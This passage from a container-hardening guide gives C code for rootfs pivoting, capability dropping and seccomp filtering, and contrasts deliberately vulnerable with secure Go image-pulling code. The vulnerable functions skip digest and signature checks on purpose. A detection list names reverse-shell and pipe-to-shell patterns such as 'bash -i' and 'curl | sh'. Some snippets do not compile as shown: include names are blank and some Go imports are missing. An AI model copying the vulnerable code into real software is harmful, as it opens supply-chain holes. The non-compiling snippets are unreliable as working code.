    if (syscall(SYS_pivot_root, ".", ".pivot_root_old") < 0) {
        perror("pivot_root");
        return -1;
    }

    /* 6. chdir to new root (now at /) */
    if (chdir("/") < 0) {
        perror("chdir /");
        return -1;
    }

    /* 7. Unmount old root - MNT_DETACH removes from mount tree immediately
     * This prevents any access to old root via /.pivot_root_old */
    if (umount2("/.pivot_root_old",
                MNT_DETACH | UMOUNT_NOFOLLOW) < 0) {
        perror("umount2 old_root");
        return -1;
    }

    /* 8. Remove the mount point directory */
    if (rmdir("/.pivot_root_old") < 0) {
        /* Not fatal - MNT_DETACH already removed it from view */
        perror("rmdir .pivot_root_old (non-fatal)");
    }

    /* 9. Remount root as read-only if required */
    /* (optional, depends on container config) */
    /* mount(NULL, "/", NULL, MS_REMOUNT | MS_RDONLY | MS_BIND, NULL); */

    return 0;
}

/*
 * SECURE: Capability dropping with verification
 */
int secure_drop_capabilities(void) {
    /* Drop bounding set first - this limits what can ever be gained */
    for (int cap = 0; cap <= CAP_LAST_CAP; cap++) {
        if (prctl(PR_CAPBSET_DROP, cap, 0, 0, 0) < 0) {
            if (errno == EINVAL) {
                break;  /* Reached beyond last valid cap */
            }
            /* EPERM means already dropped or not permitted */
        }
    }

    /* Set all sets to empty */
    struct __user_cap_header_struct hdr = {
        .version = _LINUX_CAPABILITY_VERSION_3,
        .pid = 0,  /* Self */
    };

    struct __user_cap_data_struct data[2] = {0};
    /* All sets zero = no capabilities */

    if (capset(&hdr, data) < 0) {
        perror("capset");
        return -1;
    }

    /* Verify - read back and confirm empty */
    struct __user_cap_data_struct verify[2] = {0};
    if (capget(&hdr, verify) < 0) {
        perror("capget verify");
        return -1;
    }

    /* Check all sets are zero */
    for (int i = 0; i < 2; i++) {
        if (verify[i].effective || verify[i].permitted || verify[i].inheritable) {
            fprintf(stderr, "SECURITY ERROR: Capability drop verification failed!\n");
            return -1;
        }
    }

    return 0;
}
```

### 12.2 Seccomp Filter Implementation (C)

```c
/*
 * FILE: seccomp_container.c
 *
 * Production-grade seccomp filter application for container runtime.
 * Uses libseccomp (recommended) and falls back to raw BPF.
 *
 * Build: gcc -o seccomp_container seccomp_container.c -lseccomp -lcap
 */

#define _GNU_SOURCE
#include 
#include <sys/prctl.h>
#include <linux/seccomp.h>
#include 
#include 
#include 
#include 
#include 

/* Syscalls that are ALWAYS dangerous in containers */
static const int always_deny[] = {
    SCMP_SYS(kexec_load),
    SCMP_SYS(kexec_file_load),
    SCMP_SYS(init_module),
    SCMP_SYS(finit_module),
    SCMP_SYS(delete_module),
    SCMP_SYS(iopl),
    SCMP_SYS(ioperm),
    SCMP_SYS(swapon),
    SCMP_SYS(swapoff),
    SCMP_SYS(pivot_root),    /* Container shouldn't need to pivot_root */
    SCMP_SYS(add_key),       /* Kernel keyring - information leakage */
    SCMP_SYS(request_key),
    SCMP_SYS(keyctl),
    SCMP_SYS(perf_event_open),  /* Can leak kernel/timing info */
    SCMP_SYS(bpf),              /* Block unless specifically needed */
    SCMP_SYS(userfaultfd),      /* Exploit primitive for heap UAF attacks */
    SCMP_SYS(ptrace),           /* Process inspection */
    SCMP_SYS(process_vm_readv), /* Read another process's memory */
    SCMP_SYS(process_vm_writev),/* Write to another process's memory */
    -1  /* Sentinel */
};

/*
 * SECURE: Apply tiered seccomp filter
 *
 * Tier 1: Block known-dangerous syscalls (deny list)
 * Tier 2: Apply allowlist for container-specific profile
 *
 * Using libseccomp for readability and architecture independence
 */
int apply_container_seccomp(const char **allowed_syscalls,
                             int num_allowed,
                             int use_allowlist) {
    scmp_filter_ctx ctx;
    int rc;

    /* Default action depends on mode:
     * Allowlist mode: SCMP_ACT_ERRNO(EPERM) for unlisted syscalls
     * Denylist mode: SCMP_ACT_ALLOW for unlisted syscalls
     */
    uint32_t default_action = use_allowlist ?
        SCMP_ACT_ERRNO(EPERM) :
        SCMP_ACT_ALLOW;

    ctx = seccomp_init(default_action);
    if (!ctx) {
        fprintf(stderr, "seccomp_init failed\n");
        return -1;
    }

    /* For allowlist mode: explicitly allow necessary syscalls */
    if (use_allowlist && allowed_syscalls) {
        for (int i = 0; i < num_allowed; i++) {
            int syscall_nr = seccomp_syscall_resolve_name(allowed_syscalls[i]);
            if (syscall_nr == __NR_SCMP_ERROR) {
                fprintf(stderr, "Unknown syscall: %s\n", allowed_syscalls[i]);
                continue;  /* Skip unknown, don't fail */
            }

            rc = seccomp_rule_add(ctx, SCMP_ACT_ALLOW, syscall_nr, 0);
            if (rc < 0) {
                fprintf(stderr, "seccomp_rule_add failed for %s: %s\n",
                        allowed_syscalls[i], strerror(-rc));
                seccomp_release(ctx);
                return -1;
            }
        }
    }

    /* Always deny dangerous syscalls regardless of mode */
    for (int i = 0; always_deny[i] != -1; i++) {
        rc = seccomp_rule_add(ctx, SCMP_ACT_ERRNO(EPERM),
                              always_deny[i], 0);
        if (rc < 0 && rc != -EEXIST) {  /* EEXIST: already denied by default */
            fprintf(stderr, "seccomp_rule_add deny failed: %s\n", strerror(-rc));
        }
    }

    /*
     * Special case: clone() with CLONE_NEWUSER is dangerous
     * Allow clone() but block CLONE_NEWUSER flag
     * This prevents container-in-container user namespace escalation
     */
    rc = seccomp_rule_add(ctx, SCMP_ACT_ERRNO(EPERM),
                          SCMP_SYS(clone), 1,
                          SCMP_A0(SCMP_CMP_MASKED_EQ,
                                  CLONE_NEWUSER,   /* mask */
                                  CLONE_NEWUSER)); /* value to match */
    if (rc < 0) {
        fprintf(stderr, "seccomp clone NEWUSER rule failed: %s\n",
                strerror(-rc));
    }

    /*
     * Special case: unshare() with CLONE_NEWUSER
     * Same reasoning - block user namespace creation inside container
     */
    rc = seccomp_rule_add(ctx, SCMP_ACT_ERRNO(EPERM),
                          SCMP_SYS(unshare), 1,
                          SCMP_A0(SCMP_CMP_MASKED_EQ,
                                  CLONE_NEWUSER,
                                  CLONE_NEWUSER));
    if (rc < 0) {
        fprintf(stderr, "seccomp unshare NEWUSER rule failed: %s\n",
                strerror(-rc));
    }

    /*
     * mount() restriction:
     * Most containers shouldn't mount filesystems.
     * Block all mounts except tmpfs (needed for /tmp).
     * This is complex with BPF since we can't check string args.
     * Simplest: block mount entirely, or use AppArmor for mount control.
     */
    rc = seccomp_rule_add(ctx, SCMP_ACT_ERRNO(EPERM),
                          SCMP_SYS(mount), 0);
    if (rc < 0 && rc != -EEXIST) {
        fprintf(stderr, "seccomp mount rule: %s\n", strerror(-rc));
    }

    /* Set NO_NEW_PRIVS before applying filter */
    if (prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0) != 0) {
        perror("prctl PR_SET_NO_NEW_PRIVS");
        seccomp_release(ctx);
        return -1;
    }

    /* Load the filter into the kernel */
    rc = seccomp_load(ctx);
    if (rc < 0) {
        fprintf(stderr, "seccomp_load failed: %s\n", strerror(-rc));
        seccomp_release(ctx);
        return -1;
    }

    /* Export to file for audit/debugging */
    FILE *bpf_f = fopen("/tmp/seccomp_filter.bpf", "wb");
    if (bpf_f) {
        seccomp_export_bpf(ctx, fileno(bpf_f));
        fclose(bpf_f);
    }
    FILE *pfc_f = fopen("/tmp/seccomp_filter.pfc", "w");
    if (pfc_f) {
        seccomp_export_pfc(ctx, fileno(pfc_f));
        fclose(pfc_f);
    }

    seccomp_release(ctx);
    return 0;
}

/* Example allowlist for a typical web server container */
static const char *webserver_syscalls[] = {
    /* Process */
    "read", "write", "close", "fstat", "lstat", "stat",
    "exit", "exit_group", "brk", "mmap", "munmap", "mprotect",
    "mremap", "msync", "madvise", "rt_sigaction", "rt_sigprocmask",
    "rt_sigreturn", "sigaltstack",
    /* Threading */
    "clone", "futex", "set_robust_list", "get_robust_list",
    "arch_prctl", "set_tid_address",
    /* File I/O */
    "open", "openat", "creat", "read", "pread64", "readv",
    "write", "pwrite64", "writev", "close", "lseek", "access",
    "faccessat", "readlink", "readlinkat", "getcwd",
    "getdents", "getdents64", "fcntl", "ioctl", "ftruncate",
    "truncate", "rename", "renameat", "renameat2",
    "mkdir", "mkdirat", "rmdir", "unlink", "unlinkat",
    "symlink", "symlinkat", "link", "linkat",
    /* Networking */
    "socket", "bind", "listen", "accept", "accept4", "connect",
    "getsockname", "getpeername", "setsockopt", "getsockopt",
    "sendto", "recvfrom", "sendmsg", "recvmsg", "shutdown",
    "poll", "ppoll", "select", "pselect6",
    "epoll_create", "epoll_create1", "epoll_ctl", "epoll_wait", "epoll_pwait",
    /* Time */
    "clock_gettime", "clock_getres", "gettimeofday", "time",
    "nanosleep", "clock_nanosleep",
    /* Misc */
    "getpid", "getppid", "getuid", "getgid", "geteuid", "getegid",
    "getgroups", "uname", "prctl", "getrandom",
    /* Signals */
    "kill", "tgkill", "tkill", "rt_sigqueueinfo",
    /* Memory mapping for JIT etc */
    "mmap", "mprotect",
};

int main(void) {
    int num_syscalls = sizeof(webserver_syscalls) / sizeof(webserver_syscalls[0]);

    printf("Applying seccomp filter with %d allowed syscalls\n", num_syscalls);

    if (apply_container_seccomp(webserver_syscalls, num_syscalls, 1) < 0) {
        fprintf(stderr, "Failed to apply seccomp filter\n");
        return 1;
    }

    printf("Seccomp filter applied successfully\n");
    /* Now exec the actual container process */
    return 0;
}
```

### 12.3 Container Process Isolation Setup (C)

```c
/*
 * FILE: container_setup.c
 *
 * Demonstrates complete container process setup with all security
 * controls applied in the correct order.
 * Based on production patterns from runc/libcontainer.
 *
 * Build: gcc -o container_setup container_setup.c -lcap -lseccomp
 */

#define _GNU_SOURCE
#include 
#include 
#include 
#include 
#include 
#include 
#include 
#include 
#include <sys/prctl.h>
#include <sys/capability.h>
#include <sys/mount.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <linux/securebits.h>

#define STACK_SIZE (1024 * 1024)

struct container_config {
    const char *rootfs;
    const char *hostname;
    uid_t uid;
    gid_t gid;
    const char *command;
    const char **args;
    int read_only_rootfs;
};

/*
 * SECURE: Write uid_map or gid_map for user namespace setup
 * Must be called from PARENT process
 */
static int write_id_map(pid_t pid, const char *map_file,
                         uid_t container_id, uid_t host_id, unsigned size) {
    char path[256];
    char mapping[64];
    int fd;
    ssize_t written;

    snprintf(path, sizeof(path), "/proc/%d/%s", pid, map_file);
    snprintf(mapping, sizeof(mapping), "%u %u %u\n",
             container_id, host_id, size);

    /* Use O_WRONLY without O_CREAT - file must already exist */
    fd = open(path, O_WRONLY | O_CLOEXEC);
    if (fd < 0) {
        fprintf(stderr, "Cannot open %s: %s\n", path, strerror(errno));
        return -1;
    }

    written = write(fd, mapping, strlen(mapping));
    close(fd);

    if (written != (ssize_t)strlen(mapping)) {
        fprintf(stderr, "Failed to write mapping to %s\n", path);
        return -1;
    }

    return 0;
}

/*
 * SECURE: Write "deny" to setgroups before gid_map
 * Required by kernel security: prevents privilege escalation via
 * group manipulation in user namespaces
 */
static int deny_setgroups(pid_t pid) {
    char path[256];
    int fd;

    snprintf(path, sizeof(path), "/proc/%d/setgroups", pid);
    fd = open(path, O_WRONLY | O_CLOEXEC);
    if (fd < 0) {
        fprintf(stderr, "Cannot open setgroups: %s\n", strerror(errno));
        return -1;
    }

    if (write(fd, "deny", 4) != 4) {
        close(fd);
        return -1;
    }

    close(fd);
    return 0;
}

/*
 * SECURE: Mount proc with security options
 * nosuid, noexec, nodev prevent abuse
 */
static int mount_proc(void) {
    if (mount("proc", "/proc", "proc",
              MS_NOSUID | MS_NOEXEC | MS_NODEV, NULL) < 0) {
        perror("mount /proc");
        return -1;
    }

    /* Mask dangerous /proc entries */
    const char *masked[] = {
        "/proc/kcore",
        "/proc/kallsyms",     /* Kernel symbol addresses */
        "/proc/kmsg",         /* Kernel messages */
        "/proc/sysrq-trigger",
        "/proc/latency_stats",
        "/proc/timer_stats",
        NULL
    };

    for (int i = 0; masked[i]; i++) {
        /* Bind mount /dev/null over dangerous paths */
        if (mount("/dev/null", masked[i], NULL, MS_BIND, NULL) < 0) {
            /* Non-fatal - path may not exist */
            if (errno != ENOENT)
                perror(masked[i]);
        }
    }

    /* Make /proc/sys read-only */
    if (mount(NULL, "/proc/sys", NULL,
              MS_REMOUNT | MS_RDONLY | MS_NOSUID | MS_NOEXEC | MS_NODEV,
              NULL) < 0) {
        perror("remount /proc/sys readonly");
        /* Non-fatal in some configurations */
    }

    return 0;
}

/*
 * SECURE: Setup minimal /dev in container
 * Only safe devices, no block devices, no raw disk access
 */
static int setup_dev(void) {
    /* Use tmpfs for /dev */
    if (mount("tmpfs", "/dev", "tmpfs",
              MS_NOSUID | MS_STRICTATIME,
              "mode=755,size=65536k") < 0) {
        perror("mount /dev tmpfs");
        return -1;
    }

    /* Create only necessary device files */
    /* Use mknod only for char devices with specific major:minor */
    struct {
        const char *path;
        mode_t mode;
        dev_t dev;
    } devices[] = {
        {"/dev/null",    S_IFCHR | 0666, makedev(1, 3)},
        {"/dev/zero",    S_IFCHR | 0666, makedev(1, 5)},
        {"/dev/full",    S_IFCHR | 0666, makedev(1, 7)},
        {"/dev/random",  S_IFCHR | 0444, makedev(1, 8)},
        {"/dev/urandom", S_IFCHR | 0444, makedev(1, 9)},
        {"/dev/tty",     S_IFCHR | 0666, makedev(5, 0)},
    };

    for (size_t i = 0; i < sizeof(devices)/sizeof(devices[0]); i++) {
        if (mknod(devices[i].path, devices[i].mode, devices[i].dev) < 0) {
            if (errno != EEXIST) {
                perror(devices[i].path);
                return -1;
            }
        }
        /* Ensure permissions are exactly what we set */
        chmod(devices[i].path, devices[i].mode & 0777);
    }

    /* Create /dev/pts for pseudoterminals */
    mkdir("/dev/pts", 0755);
    mount("devpts", "/dev/pts", "devpts",
          MS_NOSUID | MS_NOEXEC,
          "newinstance,ptmxmode=0666,mode=0620");

    /* /dev/ptmx -> pts/ptmx symlink */
    symlink("pts/ptmx", "/dev/ptmx");

    /* /dev/shm for POSIX shared memory */
    mkdir("/dev/shm", 01777);
    mount("shm", "/dev/shm", "tmpfs",
          MS_NOSUID | MS_NODEV | MS_NOEXEC,
          "mode=1777,size=65536k");

    return 0;
}

/*
 * SECURE: Apply securebits to prevent capability re-acquisition
 * This is defense in depth after capset()
 */
static int secure_securebits(void) {
    int bits = SECBIT_KEEP_CAPS_LOCKED |     /* Can't set KEEP_CAPS */
               SECBIT_NO_SETUID_FIXUP |       /* Don't change caps on setuid */
               SECBIT_NO_SETUID_FIXUP_LOCKED |/* Lock SETUID_FIXUP */
               SECBIT_NOROOT |                /* Root doesn't get extra caps */
               SECBIT_NOROOT_LOCKED;          /* Lock NOROOT */

    if (prctl(PR_SET_SECUREBITS, bits) < 0) {
        perror("prctl PR_SET_SECUREBITS");
        /* Non-fatal if not supported */
    }

    return 0;
}

/* Child process function - runs inside new namespaces */
static int container_child(void *arg) {
    struct container_config *cfg = (struct container_config *)arg;

    /* Wait for parent to set up uid/gid maps */
    /* (synchronization via pipe not shown for brevity) */
    sleep(1);  /* In real code: use eventfd or pipe for synchronization */

    /* 1. Setup root filesystem */
    if (chdir(cfg->rootfs) < 0) {
        perror("chdir rootfs");
        return 1;
    }

    if (secure_setup_rootfs(cfg->rootfs) < 0) {
        return 1;
    }

    /* 2. Mount necessary filesystems */
    if (mount_proc() < 0) return 1;
    if (setup_dev() < 0) return 1;

    /* /tmp as tmpfs */
    mount("tmpfs", "/tmp", "tmpfs",
          MS_NOSUID | MS_NODEV | MS_NOEXEC, "size=100m,mode=1777");

    /* /sys as read-only sysfs */
    mount("sysfs", "/sys", "sysfs",
          MS_NOSUID | MS_NOEXEC | MS_NODEV | MS_RDONLY, NULL);

    /* 3. Set hostname */
    if (cfg->hostname && sethostname(cfg->hostname, strlen(cfg->hostname)) < 0) {
        perror("sethostname");
    }

    /* 4. Set UID/GID */
    if (setresgid(cfg->gid, cfg->gid, cfg->gid) < 0) {
        perror("setresgid");
        return 1;
    }

    if (setresuid(cfg->uid, cfg->uid, cfg->uid) < 0) {
        perror("setresuid");
        return 1;
    }

    /* 5. Apply securebits */
    secure_securebits();

    /* 6. Drop ALL capabilities */
    if (secure_drop_capabilities() < 0) {
        return 1;
    }

    /* 7. Set NO_NEW_PRIVS - MUST be before seccomp */
    if (prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0) < 0) {
        perror("prctl NO_NEW_PRIVS");
        return 1;
    }

    /* 8. Apply seccomp filter - MUST be after all setup */
    if (apply_container_seccomp(webserver_syscalls,
                                 sizeof(webserver_syscalls)/sizeof(webserver_syscalls[0]),
                                 1) < 0) {
        fprintf(stderr, "Failed to apply seccomp\n");
        return 1;
    }

    /* 9. Exec container process - FROM THIS POINT: seccomp is active */
    execvp(cfg->command, (char * const *)cfg->args);
    perror("execvp");
    return 127;
}

int container_run(struct container_config *cfg) {
    char *stack = malloc(STACK_SIZE);
    if (!stack) {
        perror("malloc stack");
        return -1;
    }

    char *stack_top = stack + STACK_SIZE;

    /* Clone with all required namespace flags */
    pid_t pid = clone(container_child, stack_top,
                      CLONE_NEWUSER |   /* User namespace (rootless) */
                      CLONE_NEWPID |    /* PID namespace */
                      CLONE_NEWNS |     /* Mount namespace */
                      CLONE_NEWNET |    /* Network namespace */
                      CLONE_NEWUTS |    /* UTS (hostname) namespace */
                      CLONE_NEWIPC |    /* IPC namespace */
                      CLONE_NEWCGROUP | /* Cgroup namespace */
                      SIGCHLD,          /* Death signal to parent */
                      cfg);

    if (pid < 0) {
        perror("clone");
        free(stack);
        return -1;
    }

    /* Parent: set up UID/GID mappings for user namespace */
    uid_t current_uid = getuid();
    gid_t current_gid = getgid();

    /* Must deny setgroups before writing gid_map */
    if (deny_setgroups(pid) < 0) {
        kill(pid, SIGKILL);
        free(stack);
        return -1;
    }

    /* Map container root (0) to our current unprivileged user */
    if (write_id_map(pid, "uid_map", 0, current_uid, 1) < 0) {
        kill(pid, SIGKILL);
        free(stack);
        return -1;
    }

    if (write_id_map(pid, "gid_map", 0, current_gid, 1) < 0) {
        kill(pid, SIGKILL);
        free(stack);
        return -1;
    }

    /* Wait for container to finish */
    int status;
    waitpid(pid, &status, 0);
    free(stack);

    if (WIFEXITED(status))
        return WEXITSTATUS(status);
    if (WIFSIGNALED(status))
        return 128 + WTERMSIG(status);
    return 1;
}
```

---

## 13. Vulnerable vs Secure Code: Go Implementations

### 13.1 Container Image Pulling: Vulnerable vs Secure

```go
// FILE: image_pull_vulnerable.go
//
// VULNERABILITY: Insecure image pulling without digest verification
// This is a supply chain attack vector!
// Tag-based pulls are vulnerable to tag mutation attacks.

package main

import (
	"context"
	"fmt"
	"os"

	"github.com/containerd/containerd"
	"github.com/containerd/containerd/namespaces"
	"github.com/containerd/containerd/remotes/docker"
)

// VULNERABLE: Pull by tag without digest verification
// An attacker who controls the registry can serve a malicious image
// even if they can't change the tag (via registry API race).
func vulnerablePullImage(ctx context.Context, client *containerd.Client,
	ref string) error {

	// BUG 1: Pulling by tag (mutable reference)
	// Tag "ubuntu:22.04" can be overwritten to point to malicious content
	image, err := client.Pull(ctx, ref,
		containerd.WithPullUnpack,
		// BUG 2: No signature verification
		// BUG 3: No TLS certificate pinning
		// BUG 4: Using default resolver (trusts public registries without pinning)
		containerd.WithResolver(docker.NewResolver(docker.ResolverOptions{})),
	)
	if err != nil {
		return fmt.Errorf("pull failed: %w", err)
	}

	fmt.Printf("Pulled image: %s\n", image.Name())
	return nil
}

// VULNERABLE: No validation of image config
// A malicious image could specify dangerous entrypoints, capabilities, etc.
func vulnerableRunContainer(ctx context.Context, client *containerd.Client,
	imageName string) error {

	ctx = namespaces.WithNamespace(ctx, "default")

	image, err := client.GetImage(ctx, imageName)
	if err != nil {
		return err
	}

	// BUG: No inspection of image config before creating container
	// Image could have:
	//   - ONBUILD triggers
	//   - Dangerous volumes
	//   - Capabilities in config
	//   - Malicious entrypoint

	container, err := client.NewContainer(ctx, "my-container",
		containerd.WithImage(image),
		// BUG: No security options applied
		// No seccomp, no AppArmor, no user namespace
	)
	if err != nil {
		return err
	}
	defer container.Delete(ctx, containerd.WithSnapshotCleanup)

	return nil
}
```

```go
// FILE: image_pull_secure.go
//
// SECURE: Image pulling with full supply chain security controls
// - Digest pinning (immutable reference)
// - Signature verification via cosign/Notary
// - TLS with certificate verification
// - Image config validation before run

package main

import (
	"context"
	"crypto/sha256"
	"crypto/tls"
	"crypto/x509"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"strings"

	"github.com/containerd/containerd"
	"github.com/containerd/containerd/namespaces"
	"github.com/containerd/containerd/oci"
	"github.com/containerd/containerd/remotes/docker"
	"github.com/opencontainers/image-spec/specs-go/v1"
	specs "github.com/opencontainers/runtime-spec/specs-go"
	"github.com/sigstore/cosign/v2/pkg/cosign"
	"github.com/sigstore/sigstore/pkg/signature"
)

// ImagePolicy defines what images are allowed and with what constraints
type ImagePolicy struct {
	AllowedRegistries []string
	RequireDigest     bool
	RequireSignature  bool
	TrustedKeys       []string // cosign public keys
	MaxImageSize      int64    // bytes
}

// ImageRef represents a fully validated image reference
type ImageRef struct {
	Original string
	Registry string
	Name     string
	Tag      string
	Digest   string // SHA256 digest - REQUIRED for security
}

// ParseAndValidateRef parses an image reference and enforces policies
func ParseAndValidateRef(ref string, policy *ImagePolicy) (*ImageRef, error) {
	// Parse the reference
	// Expected format: registry/name:tag@sha256:digest
	// or: registry/name@sha256:digest (no tag - safest)

	imgRef := &ImageRef{Original: ref}

	// Extract digest - required by policy
	if policy.RequireDigest {
		if !strings.Contains(ref, "@sha256:") {
			return nil, fmt.Errorf(
				"security policy violation: image %q must be referenced by digest (@sha256:...)", ref)
		}
	}

	parts := strings.SplitN(ref, "@", 2)
	if len(parts) == 2 {
		imgRef.Digest = parts[1]
		// Validate digest format
		if !strings.HasPrefix(imgRef.Digest, "sha256:") {
			return nil, fmt.Errorf("invalid digest format: %s", imgRef.Digest)
		}
		hexPart := strings.TrimPrefix(imgRef.Digest, "sha256:")
		if len(hexPart) != 64 {
			return nil, fmt.Errorf("invalid sha256 digest length: %d", len(hexPart))
		}
		if _, err := hex.DecodeString(hexPart); err != nil {
			return nil, fmt.Errorf("invalid hex in digest: %w", err)
		}
	}

	// Parse registry from reference
	namepart := parts[0]
	slashIdx := strings.Index(namepart, "/")
	if slashIdx > 0 {
		// Check if first part looks like a hostname
		first := namepart[:slashIdx]
		if strings.Contains(first, ".") || strings.Contains(first, ":") ||
			first == "localhost" {
			imgRef.Registry = first
			namepart = namepart[slashIdx+1:]
		} else {
			imgRef.Registry = "docker.io"
		}
	} else {
		imgRef.Registry = "docker.io"
	}
	imgRef.Name = namepart

	// Validate registry is in allowed list
	if len(policy.AllowedRegistries) > 0 {
		allowed := false
		for _, reg := range policy.AllowedRegistries {
			if imgRef.Registry == reg || strings.HasSuffix(imgRef.Registry, "."+reg) {
				allowed = true
				break
			}
		}
		if !allowed {
			return nil, fmt.Errorf(
				"security policy violation: registry %q not in allowed list %v",
				imgRef.Registry, policy.AllowedRegistries)
		}
	}

	return imgRef, nil
}

// SecureTLSConfig returns a TLS configuration with strong security settings
func SecureTLSConfig(caPEMFile string) (*tls.Config, error) {
	var certPool *x509.CertPool

	if caPEMFile != "" {
		// Load custom CA for private registries
		caPEM, err := os.ReadFile(caPEMFile)
		if err != nil {
			return nil, fmt.Errorf("read CA file: %w", err)
		}
		certPool = x509.NewCertPool()
		if !certPool.AppendCertsFromPEM(caPEM) {
			return nil, fmt.Errorf("failed to parse CA certificate")
		}
	}

	return &tls.Config{
		MinVersion: tls.VersionTLS12,
		// Prefer strong cipher suites
		CipherSuites: []uint16{
			tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305,
			tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,
		},
		CurvePreferences: []tls.CurveID{
			tls.X25519,
			tls.CurveP384,
		},
		RootCAs:            certPool,
		InsecureSkipVerify: false, // NEVER set to true in production
	}, nil
}

// VerifyImageSignature verifies image signature using cosign
// Requires cosign public key or OIDC identity configuration
func VerifyImageSignature(ctx context.Context, ref string,
	publicKeyPath string) error {
	// Load public key
	keyBytes, err := os.ReadFile(publicKeyPath)
	if err != nil {
		return fmt.Errorf("read public key: %w", err)
	}

	verifier, err := signature.LoadVerifier(keyBytes, crypto.SHA256)
	if err != nil {
		return fmt.Errorf("load verifier: %w", err)
	}

	// Verify the image signature
	// cosign.VerifyImageSignatures checks:
	// 1. Signature exists in the OCI registry
	// 2. Signature is cryptographically valid for the image digest
	// 3. Certificate attributes match expected identity (if using keyless)
	co := &cosign.CheckOpts{
		SigVerifier: verifier,
		// Also validate transparency log inclusion (Rekor)
		// This provides non-repudiation and tamper evidence
		RekorURL: "https://rekor.sigstore.dev",
	}

	verified, bundleVerified, err := cosign.VerifyImageSignatures(ctx, ref, co)
	if err != nil {
		return fmt.Errorf("signature verification failed: %w", err)
	}

	if len(verified) == 0 {
		return fmt.Errorf("no valid signatures found for %s", ref)
	}

	for _, sig := range verified {
		payload, err := sig.Payload()
		if err != nil {
			continue
		}
		fmt.Printf("Valid signature found. Bundle verified: %v, payload: %s\n",
			bundleVerified, string(payload))
	}

	return nil
}

// ValidateImageConfig inspects the image configuration for security issues
// before creating a container from it
func ValidateImageConfig(config *v1.Image) error {
	var issues []string

	// Check if image runs as root
	if config.Config.User == "" || config.Config.User == "0" ||
		config.Config.User == "root" {
		issues = append(issues, "image runs as root - consider using non-root user")
	}

	// Check for dangerous volumes
	for vol := range config.Config.Volumes {
		// Volumes in image config can be dangerous:
		// - They create writable directories outside rootfs
		// - They survive container deletion (data persistence)
		// - If path is sensitive (like /etc, /run), dangerous
		dangerous := []string{"/etc", "/run", "/var/run", "/proc", "/sys"}
		for _, d := range dangerous {
			if vol == d || strings.HasPrefix(vol, d+"/") {
				issues = append(issues,
					fmt.Sprintf("dangerous volume in image config: %s", vol))
			}
		}
	}

	// Check exposed ports for privileged ports
	for port := range config.Config.ExposedPorts {
		portStr := strings.Split(string(port), "/")[0]
		var portNum int
		fmt.Sscanf(portStr, "%d", &portNum)
		if portNum > 0 && portNum < 1024 {
			issues = append(issues,
				fmt.Sprintf("image exposes privileged port %d (requires CAP_NET_BIND_SERVICE)",
					portNum))
		}
	}

	// Check for suspicious entrypoint/cmd
	dangerousPatterns := []string{
		"nc ", "ncat ", "netcat ", "curl | sh", "wget | sh",
		"bash -i", "/bin/sh -c", "python -c", "perl -e",
	}
	cmdStr := strings.Join(append(config.Config.Entrypoint, config.Config.Cmd...), " ")
	for _, pattern := range dangerousPatterns {
		if strings.Contains(strings.ToLower(cmdStr), pattern) {
			issues = append(issues,
				fmt.Sprintf("potentially dangerous command pattern: %s", pattern))
		}
	}

	if len(issues) > 0 {
		return fmt.Errorf("image validation warnings:\n- %s",
			strings.Join(issues, "\n- "))
	}

	return nil
}

// SecurePullImage pulls an image with all security controls
func SecurePullImage(ctx context.Context, client *containerd.Client,
	ref string, policy *ImagePolicy, caFile, sigKeyFile string) (containerd.Image, error) {

	ctx = namespaces.WithNamespace(ctx, "k8s.io")

	// 1. Validate reference against policy
	imgRef, err := ParseAndValidateRef(ref, policy)
	if err != nil {
		return nil, fmt.Errorf("ref validation: %w", err)
	}

	// 2. Verify signature if required
	if policy.RequireSignature && sigKeyFile != "" {
		if err := VerifyImageSignature(ctx, ref, sigKeyFile); err != nil {
			return nil, fmt.Errorf("signature verification: %w", err)
		}
	}

	// 3. Setup secure TLS
	tlsCfg, err := SecureTLSConfig(caFile)
	if err != nil {
		return nil, fmt.Errorf("TLS setup: %w", err)
	}

	httpClient := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: tlsCfg,
		},
	}

	// 4. Pull with secure resolver
	resolver := docker.NewResolver(docker.ResolverOptions{
		Client: httpClient,
		// Credentials from environment or credential store
		Hosts: docker.ConfigureDefaultRegistries(
			docker.WithClient(httpClient),
		),
	})

	// 5. Pull by digest (if available) for immutability
	pullRef := ref
	if imgRef.Digest != "" && !strings.Contains(ref, "@") {
		// Append digest to ensure we get exactly the right image
		pullRef = ref + "@" + imgRef.Digest
	}

	image, err := client.Pull(ctx, pullRef,
		containerd.WithPullUnpack,
		containerd.WithResolver(resolver),
		containerd.WithImageHandlerWrapper(
			// Verify content hash matches expected digest during pull
			// containerd does this automatically for digest-pinned refs
			func(h images.Handler) images.Handler {
				return images.HandlerFunc(func(
					ctx context.Context,
					desc ocispec.Descriptor) ([]ocispec.Descriptor, error) {
					// Log each layer as it's pulled for audit trail
					fmt.Printf("Pulling layer: %s (%d bytes)\n",
						desc.Digest, desc.Size)
					return h.Handle(ctx, desc)
				})
			},
		),
	)
	if err != nil {
		return nil, fmt.Errorf("pull image: %w", err)
	}

	// 6. Validate image configuration
	imageConfig, err := image.Config(ctx)
	if err != nil {
		return nil, fmt.Errorf("get image config: %w", err)
	}

	var ociConfig v1.Image
	configData, err := io.ReadAll(imageConfig)
	if err != nil {
		return nil, fmt.Errorf("read image config: %w", err)
	}

	// Verify config matches digest
	hash := sha256.Sum256(configData)
	expectedDigest := "sha256:" + hex.EncodeToString(hash[:])
	fmt.Printf("Image config digest: %s\n", expectedDigest)

	if err := json.Unmarshal(configData, &ociConfig); err != nil {
		return nil, fmt.Errorf("parse image config: %w", err)
	}

	if err := ValidateImageConfig(&ociConfig); err != nil {
		// Log warning but don't fail - policy decision
		fmt.Printf("WARNING: %v\n", err)
	}

	return image, nil
}

// SecureContainerSpec generates a secure OCI runtime spec
func SecureContainerSpec(image containerd.Image) (*specs.Spec, error) {
	// Start with OCI defaults
	spec := &specs.Spec{}

	// Apply security hardening
	opts := []oci.SpecOpts{
		// Run as non-root user
		oci.WithUser("1000:1000"),

		// Read-only rootfs
